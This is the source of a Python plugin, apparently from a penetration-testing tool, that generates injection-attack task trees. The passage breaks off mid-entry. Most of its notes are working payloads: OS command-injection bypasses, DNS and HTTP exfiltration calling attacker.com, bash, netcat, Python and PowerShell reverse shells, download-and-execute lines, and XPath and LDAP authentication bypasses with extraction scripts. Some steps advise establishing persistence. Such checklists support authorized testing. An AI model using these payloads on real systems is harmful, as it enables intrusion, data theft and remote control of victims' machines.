"""
Command & Code Injection Attacks Plugin

Generates detection and exploitation tasks for various injection attack vectors:
- OS command injection (Linux/Windows)
- Expression language injection (EL, OGNL, SpEL)
- XPath injection
- LDAP injection
- Email header injection
- CRLF injection
- CSV/Formula injection
- LaTeX injection
- XSLT injection
- Phone number injection

Extracted from HackTricks pentesting-web:
- command-injection.md
- xpath-injection.md
- ldap-injection.md
- email-injections.md
- formula-csv-doc-latex-ghostscript-injection.md
- crlf-0d-0a.md
- xslt-server-side-injection-extensible-stylesheet-language-transformations.md
- phone-number-injections.md

Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List, Optional
import logging
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class InjectionAttacksPlugin(ServicePlugin):
    """Injection attacks enumeration and exploitation plugin"""

    @property
    def name(self) -> str:
        return "injection-attacks"

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """
        Detect web services that might be vulnerable to injection attacks.
        This plugin activates on HTTP/HTTPS ports.
        """
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Activate on HTTP/HTTPS services
        if any(http in service for http in ['http', 'https', 'www', 'web']):
            return True

        # Common web ports
        if port in [80, 443, 8000, 8008, 8080, 8443, 8888, 3000, 4443, 9000, 9090]:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate injection attacks task tree"""

        protocol = 'https' if port in [443, 8443, 4443] or 'https' in service_info.get('service', '') else 'http'
        base_url = f'{protocol}://{target}:{port}'

        tasks = {
            'id': f'injection-attacks-{port}',
            'name': f'Injection Attacks Testing (Port {port})',
            'type': 'parent',
            'children': []
        }

        # CATEGORY 1: OS Command Injection
        tasks['children'].append(self._create_command_injection_tasks(target, port, base_url))

        # CATEGORY 2: XPath Injection
        tasks['children'].append(self._create_xpath_injection_tasks(target, port, base_url))

        # CATEGORY 3: LDAP Injection
        tasks['children'].append(self._create_ldap_injection_tasks(target, port, base_url))

        # CATEGORY 4: Email Header Injection
        tasks['children'].append(self._create_email_injection_tasks(target, port, base_url))

        # CATEGORY 5: CRLF Injection
        tasks['children'].append(self._create_crlf_injection_tasks(target, port, base_url))

        # CATEGORY 6: CSV/Formula Injection
        tasks['children'].append(self._create_csv_formula_injection_tasks(target, port, base_url))

        # CATEGORY 7: LaTeX Injection
        tasks['children'].append(self._create_latex_injection_tasks(target, port, base_url))

        # CATEGORY 8: XSLT Injection
        tasks['children'].append(self._create_xslt_injection_tasks(target, port, base_url))

        # CATEGORY 9: Phone Number Injection
        tasks['children'].append(self._create_phone_injection_tasks(target, port, base_url))

        return tasks

    def _create_command_injection_tasks(self, target: str, port: int, base_url: str) -> Dict[str, Any]:
        """OS Command Injection testing tasks"""
        return {
            'id': f'cmd-injection-{port}',
            'name': 'OS Command Injection Testing',
            'type': 'parent',
            'children': [
                {
                    'id': f'cmd-injection-params-{port}',
                    'name': 'Identify Command Injection Parameters',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Search for parameters vulnerable to command injection',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'ENUM'],
                        'notes': '''Common vulnerable parameter names:
?cmd=
?exec=
?command=
?execute=
?ping=
?query=
?jump=
?code=
?reg=
?do=
?func=
?arg=
?option=
?load=
?process=
?step=
?read=
?function=
?req=
?feature=
?exe=
?module=
?payload=
?run=
?print=

Test these parameters with injection payloads.''',
                        'success_indicators': [
                            'Command output visible in response',
                            'Time delay indicates blind injection',
                            'DNS queries received (out-of-band)'
                        ],
                        'failure_indicators': [
                            'Sanitization blocks special chars',
                            'Command not executed',
                            'Error reveals WAF/filter'
                        ],
                        'next_steps': [
                            'Test basic payloads: ; id, && whoami, | ls',
                            'Try filter bypass techniques',
                            'Use out-of-band channels for blind injection'
                        ]
                    }
                },
                {
                    'id': f'cmd-injection-basic-{port}',
                    'name': 'Test Basic Command Injection',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test basic OS command injection payloads',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'flag_explanations': {
                            'ls||id': 'Execute both commands (OR operator)',
                            'ls|id': 'Pipe output (execute both)',
                            'ls&&id': 'Execute 2nd if 1st succeeds (AND)',
                            'ls&id': 'Execute both in background',
                            'ls %0A id': 'Newline separator (RECOMMENDED)',
                            'ls;id': 'Semicolon separator (Unix only)',
                            '`ls`': 'Backtick command substitution',
                            '$(ls)': 'Command substitution'
                        },
                        'notes': '''Cross-platform payloads (Unix + Windows):
ls||id; ls ||id; ls|| id; ls || id
ls|id; ls |id; ls| id; ls | id
ls&&id; ls &&id; ls&& id; ls && id
ls&id; ls &id; ls& id; ls & id
ls %0A id
ls%0abash%09-c%09"id"%0a

Unix-only:
`ls`
$(ls)
ls; id
ls${LS_COLORS:10:1}${IFS}id

Windows-specific:
powershell C:**2\n??e*d.*?
@^p^o^w^e^r^shell c:**32\\c*?c.e?e''',
                        'success_indicators': [
                            'Command output in response',
                            'System info revealed (uname, ver)',
                            'User info revealed (whoami, id)'
                        ],
                        'failure_indicators': [
                            'Filtered characters (;, &, |, $)',
                            'Command not executed',
                            'Empty response'
                        ],
                        'alternatives': [
                            'Manual: Use Burp Suite Repeater',
                            'Manual: Test with curl POST requests',
                            'Commix: --url="http://target/?cmd=test"'
                        ],
                        'next_steps': [
                            'If successful: Escalate to reverse shell',
                            'If filtered: Try bypass techniques',
                            'If blind: Use time-based or DNS exfiltration'
                        ]
                    }
                },
                {
                    'id': f'cmd-injection-blind-time-{port}',
                    'name': 'Test Blind Command Injection (Time-based)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Detect blind command injection using time delays',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'notes': '''Time-based detection:
# Linux
sleep 5
; sleep 5 #
| sleep 5
`sleep 5`
$(sleep 5)

# Windows
ping -n 5 127.0.0.1
timeout /t 5

# Data exfiltration (char-by-char):
time if [ $(whoami|cut -c 1) == r ]; then sleep 5; fi

If response delays by 5 seconds → command injection confirmed''',
                        'success_indicators': [
                            'Response delays by specified time',
                            'Consistent delay across tests',
                            'No delay with invalid syntax'
                        ],
                        'failure_indicators': [
                            'No delay observed',
                            'Network latency only',
                            'Random delays (not consistent)'
                        ],
                        'alternatives': [
                            'Manual: Use curl with --max-time flag',
                            'Burp Suite: Intruder with response time analysis'
                        ],
                        'next_steps': [
                            'Extract data character-by-character with conditional delays',
                            'Use DNS exfiltration for faster extraction',
                            'Escalate to reverse shell if time-based confirmed'
                        ]
                    }
                },
                {
                    'id': f'cmd-injection-blind-dns-{port}',
                    'name': 'Test Blind Command Injection (DNS exfiltration)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Detect and extract data using DNS queries',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'STEALTH'],
                        'notes': '''DNS-based data exfiltration:
# List directory contents
for i in $(ls /); do host "$i.YOUR-COLLAB-SERVER.com"; done

# Exfiltrate command output
$(host $(whoami).YOUR-COLLAB-SERVER.com)
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').YOUR-COLLAB-SERVER.com)

Online DNS loggers:
- dnsbin.zhack.ca
- pingb.in
- Burp Collaborator
- interactsh.com

Check DNS logs for queries containing exfiltrated data''',
                        'success_indicators': [
                            'DNS queries received with data',
                            'Command output in subdomain',
                            'Multiple queries for multiple items'
                        ],
                        'failure_indicators': [
                            'No DNS queries received',
                            'DNS resolution blocked',
                            'Firewall blocks outbound DNS'
                        ],
                        'alternatives': [
                            'HTTP exfiltration: curl http://attacker.com/$(whoami)',
                            'ICMP exfiltration: ping -c 1 $(whoami).attacker.com',
                            'Manual: Setup tcpdump to capture DNS queries'
                        ],
                        'next_steps': [
                            'Exfiltrate sensitive files (/etc/passwd, config files)',
                            'Enumerate system information',
                            'Establish reverse shell'
                        ]
                    }
                },
                {
                    'id': f'cmd-injection-bypass-{port}',
                    'name': 'Command Injection Filter Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass WAF/filters blocking command injection',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'notes': '''Linux bypass techniques:
# Variable expansion
ls${IFS}
cat${IFS}/etc/passwd
${PATH:0:1}bin${PATH:0:1}ls

# Wildcards
/???/??t /???/p??swd
/bin/c?t /etc/pass??

# Hex encoding
$(printf "\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64")

# Base64 encoding
echo PAYLOAD | base64 -d | bash

# Case manipulation
CaT /etc/passwd

Windows bypass:
# Caret escape
c^o^m^m^a^n^d
@^p^o^w^e^r^shell c:**32\\c*?c.e?e

# Double quotes
po"wer"shell

# Wildcards
powershell C:**2\n??e*d.*?

NodeJS-specific (child_process.exec):
# Avoid: exec() spawns shell → command injection
# Use: execFile() with args array → no shell''',
                        'success_indicators': [
                            'Bypass successful, command executed',
                            'Filter evasion confirmed',
                            'Different encoding works'
                        ],
                        'failure_indicators': [
                            'All bypass attempts blocked',
                            'Strong input validation',
                            'Whitelist-based filtering'
                        ],
                        'alternatives': [
                            'Try argument injection (leading hyphen)',
                            'Test for other injection types (SQL, XSS)',
                            'Look for alternative attack vectors'
                        ],
                        'next_steps': [
                            'Escalate to reverse shell',
                            'Download and execute malicious script',
                            'Establish persistence'
                        ]
                    }
                },
                {
                    'id': f'cmd-injection-argv-{port}',
                    'name': 'Argument/Option Injection via Leading Hyphen',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test argument injection without shell metacharacters',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'notes': '''Argument injection (no shell metacharacters needed):

If application passes user input as arguments to system utilities
(even with execve/execFile), many programs parse "-" and "--" as options.

Common vulnerable patterns:
- ping <user>
- tcpdump -i <iface> -w <file>
- curl <url>
- tar -xf <file>

Test payloads:
# ping: Stress device (DoS)
-f
-c 100000

# curl: Write arbitrary paths, load attacker config
-o /tmp/x
-K http://attacker.com/config

# tcpdump: Post-rotate execution
-G 1 -W 1 -z /path/script.sh

# tar: Write files outside extraction dir
../../etc/passwd

Generic PoC against CGI handlers:
POST /cgi-bin/handler.cgi
topicurl=setConfig&param=-n

# If handler concatenates into shell:
topicurl=setConfig&agentName=;id;

Many tools support "--" to end options, but naive mitigations
can be bypassed if "--" is placed incorrectly.''',
                        'success_indicators': [
                            'Command behavior changes',
                            'File written to arbitrary path',
                            'DoS achieved via resource exhaustion',
                            'Script execution via tool-specific flags'
                        ],
                        'failure_indicators': [
                            'Arguments validated/sanitized',
                            'Whitelist enforcement',
                            'Tool does not accept dangerous flags'
                        ],
                        'alternatives': [
                            'Try shell metacharacters if shell is spawned',
                            'Combine with path traversal',
                            'Look for other injection points'
                        ],
                        'next_steps': [
                            'Escalate to RCE if tool supports dangerous flags',
                            'Write webshell if write access achieved',
                            'Abuse tool-specific features for further exploitation'
                        ]
                    }
                },
                {
                    'id': f'cmd-injection-rce-{port}',
                    'name': 'Escalate to Reverse Shell',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Establish reverse shell after confirming command injection',
                        'tags': ['OSCP:HIGH', 'EXPLOIT'],
                        'notes': '''Reverse shell payloads:

Bash:
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'

Netcat:
nc -e /bin/bash LHOST LPORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f

Python:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

PowerShell (Windows):
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

Download and execute:
wget http://LHOST/shell.sh -O /tmp/shell.sh; bash /tmp/shell.sh
curl http://LHOST/shell.exe -o C:\\temp\\shell.exe; C:\\temp\\shell.exe
powershell IEX(wget http://LHOST/shell.exe) -OutFile $env:Temp\\shell.exe; Start-Process $env:Temp\\shell.exe

Setup listener first:
nc -lvnp LPORT''',
                        'success_indicators': [
                            'Reverse shell connection established',
                            'Interactive shell access',
                            'Commands execute on target'
                        ],
                        'failure_indicators': [
                            'Firewall blocks outbound connections',
                            'No connection received',
                            'Shell dies immediately'
                        ],
                        'alternatives': [
                            'Try different ports (80, 443, 53, 8080)',
                            'Use bind shell if reverse fails',
                            'Webshell upload if shell blocked'
                        ],
                        'next_steps': [
                            'Upgrade to TTY shell: python -c "import pty;pty.spawn(\'/bin/bash\')"',
                            'Enumerate system for privilege escalation',
                            'Establish persistence'
                        ]
                    }
                }
            ]
        }

    def _create_xpath_injection_tasks(self, target: str, port: int, base_url: str) -> Dict[str, Any]:
        """XPath Injection testing tasks"""
        return {
            'id': f'xpath-injection-{port}',
            'name': 'XPath Injection Testing',
            'type': 'parent',
            'children': [
                {
                    'id': f'xpath-detect-{port}',
                    'name': 'Detect XPath Injection',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for XPath injection in XML-based queries',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'ENUM'],
                        'notes': '''XPath injection targets applications that build XPath queries from user input.

Test for error-based detection:
' or '1'='1
" or "1"="1
' or ''='
" or ""="

Test for blind detection:
' or 1=1 or ''='
' or true() or ''='

If application uses XPath like:
//user[name='USER' and password='PASS']

Injection: ' or '1'='1
Results in: //user[name='' or '1'='1' and password='']

This bypasses authentication by making query always true.''',
                        'success_indicators': [
                            'XPath syntax errors in response',
                            'Authentication bypass successful',
                            'Data leakage in response'
                        ],
                        'failure_indicators': [
                            'Input sanitized',
                            'No XPath errors',
                            'Parameterized queries used'
                        ],
                        'alternatives': [
                            'Manual: Test with Burp Suite',
                            'xxxpwn tool: automated XPath injection',
                            'xcat tool: blind XPath exploitation'
                        ],
                        'next_steps': [
                            'If detected: Enumerate XML structure',
                            'Extract sensitive data from XML',
                            'Attempt authentication bypass'
                        ]
                    }
                },
                {
                    'id': f'xpath-auth-bypass-{port}',
                    'name': 'XPath Authentication Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass authentication using XPath injection',
                        'tags': ['OSCP:HIGH', 'EXPLOIT'],
                        'notes': '''Authentication bypass payloads:

OR bypass (user and password):
' or '1'='1
" or "1"="1
' or ''='
" or ""="

Null injection:
Username: ' or 1]%00
Password: any

Double OR (single vulnerable field):
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '

Select specific account:
'or string-length(name(.))<10 or'
'or contains(name,'adm') or'
'or contains(.,'adm') or'
'or position()=2 or'

Select account with known name:
admin' or '
admin' or '1'='2

Example vulnerable query:
//user[name/text()='USER' and password/text()='PASS']/account/text()

With payload: ' or '1'='1
Becomes: //user[name/text()='' or '1'='1' and password/text()='']

This returns all users since '1'='1' is always true.''',
                        'success_indicators': [
                            'Login successful without credentials',
                            'Admin access achieved',
                            'Multiple accounts returned'
                        ],
                        'failure_indicators': [
                            'Login failed',
                            'Input validation blocks injection',
                            'Account lockout triggered'
                        ],
                        'alternatives': [
                            'Try LDAP injection if XPath fails',
                            'Test SQL injection',
                            'Look for other auth mechanisms'
                        ],
                        'next_steps': [
                            'Enumerate accessible accounts',
                            'Extract sensitive data',
                            'Escalate privileges'
                        ]
                    }
                },
                {
                    'id': f'xpath-data-extraction-{port}',
                    'name': 'XPath Data Extraction',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Extract data from XML using XPath injection',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'notes': '''Data extraction payloads:

Extract all values:
') or 1=1 or ('
') or 1=1] | //user/password[('')=('
') or 2=1] | //user/node()[('')=('
')] | //./node()[('')=('
')] | //node()[('')=('

Extract specific fields:
')] | //user/*[1] | a[('     # IDs
')] | //user/*[2] | a[('     # Names
')] | //user/*[3] | a[('     # Passwords
')] | //user/*[4] | a[('     # Accounts

Null injection:
')] | //password%00          # All passwords

Extract siblings:
')]/../*[3][text()!=('       # 3rd sibling (passwords)

Example XML:
<user>
  <name>admin</name>
  <password>secret</password>
  <account>administrator</account>
</user>

Access all names: //name
Access all values: //user/node()
Access by position: //user[position()=1]/name
''',
                        'success_indicators': [
                            'XML data visible in response',
                            'Multiple records extracted',
                            'Sensitive fields revealed'
                        ],
                        'failure_indicators': [
                            'Output sanitized',
                            'Limited data returned',
                            'Error handling hides data'
                        ],
                        'alternatives': [
                            'Blind extraction if direct fails',
                            'Use XPath functions: substring(), string-length()',
                            'Out-of-band exfiltration with doc()'
                        ],
                        'next_steps': [
                            'Extract credentials',
                            'Map complete XML schema',
                            'Use credentials for further access'
                        ]
                    }
                },
                {
                    'id': f'xpath-blind-{port}',
                    'name': 'Blind XPath Injection',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Extract data via blind XPath injection',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'notes': '''Blind XPath exploitation:

Boolean-based:
' or string-length(//user[position()=1]/child::node()[position()=1])=4 or ''='
(True if username length is 4)

' or substring((//user[position()=1]/child::node()[position()=1]),1,1)="a" or ''='
(True if first char is 'a')

Character-by-character extraction:
substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_CODE)

Error-based:
... and ( if ( $employee/role = 2 ) then error() else 0 )...

Out-of-band (OOB):
doc(concat("http://attacker.com/", //user[1]/username))
doc-available(concat("http://attacker.com/", //user[1]/username))

Python blind extraction script:
for i in range(1, length + 1):
    for char in alphabet:
        r = requests.get(f"?userid=2 and substring(password,{i},1)={char}")
        if "TRUE_CONDITION" in r.text:
            password += char
            break

Read files:
substring((doc('file://protected/secret.xml')/*[1]/*[1]/text()[1]),3,1) < 127''',
                        'success_indicators': [
                            'Boolean conditions work',
                            'Data extracted char-by-char',
                            'OOB requests received'
                        ],
                        'failure_indicators': [
                            'No response differences',
                            'OOB blocked by firewall',
                            'Slow extraction speed'
                        ],
                        'alternatives': [
                            'xcat tool: automated blind XPath',
                            'xpath-blind-explorer',
                            'Manual: Python script for automation'
                        ],
                        'next_steps': [
                            'Extract all usernames and passwords',
                            'Read sensitive XML files',
                            'Use extracted credentials'
                        ]
                    }
                },
                {
                    'id': f'xpath-schema-enum-{port}',
                    'name': 'Enumerate XML Schema',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Map XML structure using XPath injection',
                        'tags': ['OSCP:LOW', 'MANUAL', 'ENUM'],
                        'notes': '''Schema enumeration:

Count root elements:
and count(/*) = 1

Count children:
and count(/*[1]/*) = 2

Recursive counting:
and count(/*[1]/*[1]/*) = 1
and count(/*[1]/*[2]/*) = 3

This reveals structure:
<root>
  <a>
    <b></b>
  </a>
  <c>
    <d></d>
    <e></e>
    <f></f>
  </c>
</root>

Confirm tag names:
and name(/*[1]) = "root"
and substring(name(/*[1]/*[1]),1,1) = "a"

Get codepoint:
and string-to-codepoints(substring(name(/*[1]/*[1]/*),1,1)) = 98
(98 = 'b')

OOB schema extraction:
doc(concat("http://attacker.com/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))''',
                        'success_indicators': [
                            'Schema structure revealed',
                            'Tag names extracted',
                            'Element hierarchy mapped'
                        ],
                        'failure_indicators': [
                            'Query syntax errors',
                            'No boolean feedback',
                            'Complex schema too deep'
                        ],
                        'alternatives': [
                            'Direct data extraction if schema known',
                            'Guess common tag names (user, password, account)',
                            'Use automated tools: XmlChor'
                        ],
                        'next_steps': [
                            'Target sensitive elements',
                            'Extract data from known structure',
                            'Document schema for reporting'
                        ]
                    }
                }
            ]
        }

    def _create_ldap_injection_tasks(self, target: str, port: int, base_url: str) -> Dict[str, Any]:
        """LDAP Injection testing tasks"""
        return {
            'id': f'ldap-injection-{port}',
            'name': 'LDAP Injection Testing',
            'type': 'parent',
            'children': [
                {
                    'id': f'ldap-detect-{port}',
                    'name': 'Detect LDAP Injection',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for LDAP injection vulnerabilities',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'ENUM'],
                        'notes': '''LDAP injection targets apps that build LDAP filters from user input.

LDAP filter syntax:
Filter = ( filtercomp )
Filtercomp = and / or / not / item
And = & filterlist
Or = | filterlist
Not = ! filter
Item = simple / present / substring

(&) = Absolute TRUE
(|) = Absolute FALSE

Example vulnerable filter:
(&(uid=USER)(password=PASS))

Test payloads:
*
*)(&
*)(|(&
*)(|(password=*
*))%00

If vulnerable, these manipulate filter logic.''',
                        'success_indicators': [
                            'LDAP syntax errors',
                            'Different responses for true/false conditions',
                            'Authentication bypass achieved'
                        ],
                        'failure_indicators': [
                            'Input sanitized',
                            'No LDAP errors',
                            'Parameterized LDAP queries'
                        ],
                        'alternatives': [
                            'Try XPath injection if LDAP fails',
                            'Test SQL injection',
                            'Look for direct LDAP port access (389/636)'
                        ],
                        'next_steps': [
                            'Attempt authentication bypass',
                            'Enumerate LDAP attributes',
                            'Extract directory data'
                        ]
                    }
                },
                {
                    'id': f'ldap-auth-bypass-{port}',
                    'name': 'LDAP Authentication Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass authentication using LDAP injection',
                        'tags': ['OSCP:HIGH', 'EXPLOIT'],
                        'notes': '''LDAP auth bypass payloads:

Wildcard bypass:
user: *
password: *
Result: (&(user=*)(password=*))

AND bypass:
user: *)(&
password: *)(&
Result: (&(user=*)(&)(password=*)(&))

OR bypass:
user: *)(|(&
password: pwd
Result: (&(user=*)(|(&)(password=pwd))

Null injection:
user: *))%00
password: any
Result: (&(user=*))%00 → nothing after executed

Combined OR:
user: *)(|(password=*
password: test
Result: (&(user=*)(|(password=*)(password=test))

NOT bypass:
username: admin)(!(&(|
password: any
Result: (&(uid=admin)(!(& (|) (password=any))))
(|) is FALSE, so password check becomes True

Admin-specific:
user: admin)(&)
password: pwd

Nested wildcards:
username: *
password: *)(&

Direct match:
username: admin))(|(|
password: any
Result: (&(uid=admin)) (| (|) (password=any))

NOTE: Asterisks are very powerful in LDAP filters!''',
                        'success_indicators': [
                            'Login successful without valid credentials',
                            'Access to admin account',
                            'Multiple accounts accessible'
                        ],
                        'failure_indicators': [
                            'Login failed',
                            'LDAP syntax error',
                            'Account lockout'
                        ],
                        'alternatives': [
                            'Try different LDAP servers (OpenLDAP, ADAM, SunOne)',
                            'Use LDAP enumeration tools',
                            'Test for blind LDAP injection'
                        ],
                        'next_steps': [
                            'Enumerate accessible accounts',
                            'Extract directory information',
                            'Escalate to domain admin if in AD environment'
                        ]
                    }
                },
                {
                    'id': f'ldap-blind-{port}',
                    'name': 'Blind LDAP Injection',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Extract data via blind LDAP injection',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'notes': '''Blind LDAP injection:

Force true condition (data returned):
*)(objectClass=*))(&objectClass=void

Force false condition (no data):
void)(objectClass=void))(&objectClass=void

Data extraction (character-by-character):
(&(sn=admin)(password=*))    → OK
(&(sn=admin)(password=A*))   → KO
(&(sn=admin)(password=M*))   → OK
(&(sn=admin)(password=MA*))  → KO
...

Python blind extraction script:
attributes = ["cn", "uid", "mail", "password", "userPassword"]

for attribute in attributes:
    value = ""
    while not finish:
        for char in alphabet:
            query = f"*)({attribute}={value}{char}*"
            data = {'login':query, 'password':'test'}
            r = requests.post(url, data=data)
            if "SUCCESS_INDICATOR" in r.text:
                value += char
                break

Common LDAP attributes:
- cn (Common Name)
- uid (User ID)
- mail (Email)
- userPassword (Password hash)
- sn (Surname)
- givenName (First name)
- telephoneNumber
- objectClass''',
                        'success_indicators': [
                            'Different responses for valid/invalid data',
                            'Character-by-character extraction works',
                            'Attributes enumerated successfully'
                        ],
                        'failure_indicators': [
                            'No response differences',
                            'Slow extraction speed',
                            'Rate limiting triggered'
                        ],
                        'alternatives': [
                            'Use automated tools: ldapinjection.py',
                            'Try error-based extraction if possible',
                            'Access LDAP port directly (389/636)'
                        ],
                        'next_steps': [
                            'Extract all user attributes',
                            'Crack password hashes if retrieved',
                            'Use credentials for further access'
                        ]
                    }
                },
                {
                    'id': f'ldap-enum-attrs-{port}',
                    'name': 'Enumerate LDAP Attributes',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Discover valid LDAP attributes via injection',
                        'tags': ['OSCP:LOW', 'MANUAL', 'ENUM'],
                        'notes': '''LDAP objects contain default attributes that can be bruteforced.

Common LDAP attributes:
- c (Country)
- cn (Common Name)
- co (Company)
- commonName
- dc (Domain Component)
- facsimileTelephoneNumber
- givenName
- gn (Given Name)
- homePhone
- id
- jpegPhoto
- l (Locality)
- mail
- mobile
- name
- o (Organization)
- objectClass
- ou (Organizational Unit)
- owner
- pager
- password
- sn (Surname)
- st (State)
- surname
- uid (User ID)
- username
- userPassword

Test each attribute:
*)(<ATTRIBUTE>=*)

If response differs, attribute exists and can be extracted.

Use wordlist:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP_attributes.txt''',
                        'success_indicators': [
                            'Valid attributes identified',
                            'Data retrieved for attributes',
                            'Attribute list complete'
                        ],
                        'failure_indicators': [
                            'No attributes respond',
                            'All requests identical',
                            'Schema unknown'
                        ],
                        'alternatives': [
                            'Use Burp Intruder with LDAP attribute wordlist',
                            'Try common attributes first',
                            'Access LDAP directly for schema info'
                        ],
                        'next_steps': [
                            'Extract data from discovered attributes',
                            'Focus on sensitive attributes (password, mail)',
                            'Build complete directory profile'
                        ]
                    }
                }
            ]
        }

    def _create_email_injection_tasks(self, target: str, port: int, base_url: str) -> Dict[str, Any]:
        """Email Header Injection testing tasks"""
        return {
            'id': f'email-injection-{port}',
            'name': 'Email Header Injection Testing',
            'type': 'parent',
            'children': [
                {
                    'id': f'email-inject-headers-{port}',
                    'name': 'Test Email Header Injection',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Inject additional email headers via CRLF',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'notes': '''Email header injection via CRLF:

Inject Cc and Bcc:
From: sender@domain.com%0ACc:attacker@domain.com,%0ABcc:attacker2@domain.com

Inject To:
From: sender@domain.com%0ATo:attacker@domain.com

Inject Subject:
From: sender@domain.com%0ASubject:This%20is%20Fake%20Subject

Change message body (two line feeds):
From: sender@domain.com%0A%0AMy%20New%20Fake%20Message.

Why this works:
Email headers separated by CRLF (\\r\\n = %0D%0A)
Injecting CRLF adds new headers
Double CRLF ends headers and starts body

Use cases:
- Send spam via legitimate server
- Phishing attacks
- Account takeover via password reset manipulation
- Information disclosure''',
                        'success_indicators': [
                            'Email received at attacker address',
                            'Injected headers visible in email',
                            'Multiple recipients added'
                        ],
                        'failure_indicators': [
                            'CRLF stripped',
                            'Email not sent',
                            'Injection blocked by validation'
                        ],
                        'alternatives': [
                            'Try different encodings: %0D%0A, \\r\\n, \\x0D\\x0A',
                            'Test PHP mail() function exploitation',
                            'Look for other email-sending features'
                        ],
                        'next_steps': [
                            'Test PHP mail() 5th parameter exploitation',
                            'Attempt email address bypass techniques',
                            'Chain with other vulnerabilities (SSRF, XSS)'
                        ]
                    }
                },
                {
                    'id': f'email-php-mail-{port}',
                    'name': 'PHP mail() Function Exploitation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit PHP mail() 5th parameter for RCE',
                        'tags': ['OSCP:HIGH', 'EXPLOIT'],
                        'notes': '''PHP mail() function:
mail($to, $subject, $message, $additional_headers, $additional_parameters)

The 5th parameter ($additional_parameters) is passed to sendmail CLI.
Even with escapeshellcmd(), can inject additional sendmail parameters.

Exploitation depends on MTA (Sendmail, Postfix, Exim):

Sendmail MTA:
-O QueueDirectory=/tmp
-X /tmp/logfile (log commands to file)
-C /tmp/config (use alternate config)

Postfix MTA:
Similar to Sendmail but different flags

Exim MTA:
-C /tmp/config (use alternate config)
-D macro=value (set macro)

Potential impacts:
- File write (via -X flag)
- File read (via log analysis)
- RCE (via config manipulation)

Test if 5th parameter is controllable:
?email=test@test.com&extra=-Xtest.log

Check for:
- Sendmail version and MTA
- Log file creation
- Config file specification

Reference:
https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html''',
                        'success_indicators': [
                            'File created via -X flag',
                            'Sendmail parameters accepted',
                            'RCE achieved via config manipulation'
                        ],
                        'failure_indicators': [
                            'Parameters filtered',
                            '5th parameter not controllable',
                            'MTA doesn\'t support dangerous flags'
                        ],
                        'alternatives': [
                            'Standard email header injection',
                            'Try other email-sending mechanisms',
                            'Look for file upload/include vulns'
                        ],
                        'next_steps': [
                            'Achieve RCE via sendmail flags',
                            'Write webshell using -X logging',
                            'Establish reverse shell'
                        ]
                    }
                },
                {
                    'id': f'email-address-bypass-{port}',
                    'name': 'Email Address Format Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass email validation and domain restrictions',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'notes': '''Email address bypass techniques:

Ignored characters:
+, -, {} are often ignored
john.doe+intigriti@example.com → john.doe@example.com

Comments (ignored):
john.doe(intigriti)@example.com → john.doe@example.com

Quotes (whitelist bypass):
"<any text>"@example.com
"admin"@example.com
"test@attacker.com"@example.com

IP addresses:
john.doe@[127.0.0.1]
john.doe@[IPv6:2001:db8::1]

Encoding bypasses:
